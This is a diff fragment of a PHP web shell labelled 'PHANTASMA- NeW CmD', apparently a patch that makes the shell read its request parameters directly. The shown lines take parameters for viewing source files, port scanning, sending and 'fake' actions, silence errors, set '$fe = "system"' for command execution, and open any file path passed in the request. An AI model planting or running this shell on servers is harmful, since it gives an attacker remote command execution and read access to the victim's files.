@@ -1,3 +1,13 @@
+<?php
+error_reporting(0);
+$see = $_REQUEST['see'];
+$dx = $_REQUEST['dx'];
+$sfc = $_REQUEST['sfc'];
+$fileinfo = $_REQUEST['fileinfo'];
+$fake = $_REQUEST['fake'];
+$send = $_REQUEST['send'];
+$portscan = $_REQUEST['portscan'];
+?>
 <CENTER>
 <DIV STYLE="font-family: verdana; font-size: 25px; font-weight: bold; color: #F3b700;">PHANTASMA- NeW CmD ;) </DIV>
 <BR>
@@ -546,7 +556,7 @@ $fe = "system";
 </CENTER>
 <pre><font face="Tahoma" size="2">
 <?php
-
+ 
 // Function to Visualize Source Code files 
 if ($see != "") {
   $fp = fopen($see, "r"); 
